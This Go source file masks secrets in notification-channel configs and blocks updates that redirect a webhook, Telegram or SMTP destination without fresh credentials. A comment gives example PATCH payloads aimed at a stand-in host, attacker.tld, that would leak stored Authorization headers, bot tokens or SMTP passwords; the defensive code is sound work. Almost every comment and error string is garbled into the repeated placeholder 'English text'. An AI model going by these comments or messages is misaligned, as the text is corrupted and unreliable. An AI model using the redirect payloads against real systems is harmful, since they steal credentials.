package notify

import (
	"encoding/json"
	"fmt"
	"strings"
)

// MaskedPrefix English text。API English text，
// English text「English text」。
//
// English text，English text
// （English text MaskedValue），English text「English text」English text。
const MaskedPrefix = "__masked__"

// MaskedValue English text：
//
//	"__masked__"              English text，English text
//	"__masked__:…ab12cd"      English text 6 English text
//
// English text 6 English text：Webhook English text（English text key、
// English text id），English text、English text。English text 6 English text
// English text，English text「English text」。
func MaskedValue(secret string) string {
	if len(secret) <= 6 {
		return MaskedPrefix
	}
	return MaskedPrefix + ":…" + secret[len(secret)-6:]
}

// IsMasked English text（English text）。
func IsMasked(v string) bool { return strings.HasPrefix(v, MaskedPrefix) }

// MaskConfig English text，English text。
//
// English text map English text——English text UI English text「English text」，
// English text。
// English text，UI English text。
func MaskConfig(kind string, cfg map[string]any) map[string]any {
	channel, ok := Get(kind)
	if !ok {
		return map[string]any{}
	}
	secrets := map[string]bool{}
	for _, k := range channel.SecretKeys() {
		secrets[k] = true
	}
	out := make(map[string]any, len(cfg))
	for k, v := range cfg {
		if !secrets[k] {
			out[k] = v
			continue
		}
		// headers English text：English text
		// English text「English text」English text，English text。
		if s, ok := v.(string); ok {
			out[k] = MaskedValue(s)
			continue
		}
		out[k] = MaskedPrefix
	}
	return out
}

// ErrDestinationChangedWithoutCredentials English text「English text，English text
// English text」。English text，English text PrepareConfigUpdate。
type ErrDestinationChangedWithoutCredentials struct {
	Changed []string // English text
	Missing []string // English text
}

func (e *ErrDestinationChangedWithoutCredentials) Error() string {
	return "English text（" + strings.Join(e.Changed, "、") + "）English text，English text（" +
		strings.Join(e.Missing, "、") + "）：English text，English text。" +
		"English text，English text。"
}

// PrepareConfigUpdate English text，English text「English text」English text。
//
// English text MergeConfig English text，English text：
// English text（English text）English text（English text）English text，English text MergeConfig
// English text「English text」English text。English text PATCH English text**English text、
// English text**，English text：
//
//	webhook  {config:{url:"https://attacker.tld"}}  → English text Authorization English text
//	telegram {config:{base_url:"https://attacker.tld"}} → /bot<English textToken>/sendMessage
//	email    {config:{host:"smtp.attacker.tld"}}    → STARTTLS English text
//
// English text、English text（English text），
// English text——「English text」。
//
// English text：English text，English text**English text**English text：
//   - English text → English text
//   - English text → English text（English text）
//   - English text / English text → English text
//
// English text，English text「English text」English text「English text」，English text
// English text。English text「English text」——English text
// （webhook English text headers、email English text password）English text「English text 200」，
// English text。English text。
func PrepareConfigUpdate(kind string, stored, incoming map[string]any) (map[string]any, error) {
	channel, ok := Get(kind)
	if !ok {
		return nil, fmt.Errorf("English text %q English text", kind)
	}
	secrets := channel.SecretKeys()
	destinations := channel.DestinationKeys()

	// English text（English text webhook English text headers English text）English text，
	// English text「English text」English text。MergeConfig English text「English text
	// English text」English text，English text——English text
	// "__masked__"，English text。English text。
	//
	// English text**English text**：English text，English text
	// English text「English text」English text（English text，English text）。
	if err := rejectMaskedInContainers(incoming, secrets); err != nil {
		return nil, err
	}

	// English text。English text「English text」。
	var changed []string
	for _, key := range destinations {
		raw, present := incoming[key]
		if !present {
			continue
		}
		s, isStr := raw.(string)
		if isStr && IsMasked(s) {
			continue
		}
		if !sameConfigValue(raw, stored[key]) {
			changed = append(changed, key)
		}
	}
	if len(changed) == 0 {
		// English text，English text（English text、English text、English text）。
		return MergeConfig(stored, incoming), nil
	}

	// English text：English text。
	var missing []string
	for _, key := range secrets {
		raw, present := incoming[key]
		if !present {
			missing = append(missing, key)
			continue
		}
		if s, isStr := raw.(string); isStr && IsMasked(s) {
			missing = append(missing, key)
		}
	}
	if len(missing) > 0 {
		return nil, &ErrDestinationChangedWithoutCredentials{Changed: changed, Missing: missing}
	}
	return MergeConfig(stored, incoming), nil
}

// rejectMaskedInContainers English text。
//
// English text「English text」。English text webhook English text headers English text，
// English text（English text "__masked__"）English text；English text
// English text「English text」，English text。
func rejectMaskedInContainers(incoming map[string]any, secretKeys []string) error {
	for _, key := range secretKeys {
		raw, present := incoming[key]
		if !present {
			continue
		}
		if _, isStr := raw.(string); isStr {
			continue
		}
		encoded, err := json.Marshal(raw)
		if err != nil {
			continue
		}
		if strings.Contains(string(encoded), MaskedPrefix) {
			return fmt.Errorf("English text %s English text %q：English text、English text，English text",
				key, MaskedPrefix)
		}
	}
	return nil
}

// sameConfigValue English text。English text JSON English text
// English text——English text number，English text float64，English text == English text。
//
// 「English text」English text：English text「English text」English text，
// English text MergeConfig English text、English text delete English text。English text，English text
// English text（Telegram English text base_url English text：English text
// English text）English text——
//
//	English text base_url:""  →  English text MergeConfig English text
//	→ English text incoming English text ""、stored English text，English text「English text」
//	→ English text → 400「English text，English text」
//
// English text，English text Bot Token，English text。
func sameConfigValue(a, b any) bool {
	if isBlankConfigValue(a) && isBlankConfigValue(b) {
		return true
	}
	ra, errA := json.Marshal(a)
	rb, errB := json.Marshal(b)
	if errA != nil || errB != nil {
		return false
	}
	return string(ra) == string(rb)
}

// isBlankConfigValue English text「English text」。
// English text MergeConfig English text（strings.TrimSpace(s) == ""），
// English text「MergeConfig English text、sameConfigValue English text」English text。
func isBlankConfigValue(v any) bool {
	if v == nil {
		return true
	}
	s, ok := v.(string)
	return ok && strings.TrimSpace(s) == ""
}

// MergeConfig English text incoming English text stored English text，English text。
//
// English text：
//   - incoming English text → English text stored English text（English text）
//   - incoming English text → English text，English text
//   - English text → English text incoming English text
//   - stored English text incoming English text → English text（English text）
//
// English text「English text」English text：English text，
// English text，English text「English text」English text。
// English text，English text，English text
// （English text「English text」English text「English text」，English text UI English text）。
func MergeConfig(stored, incoming map[string]any) map[string]any {
	out := make(map[string]any, len(stored)+len(incoming))
	for k, v := range stored {
		out[k] = v
	}
	for k, v := range incoming {
		if s, ok := v.(string); ok {
			if IsMasked(s) {
				continue // English text = English text，English text stored
			}
			if strings.TrimSpace(s) == "" {
				delete(out, k)
				continue
			}
			out[k] = s
			continue
		}
		out[k] = v
	}
	return out
}
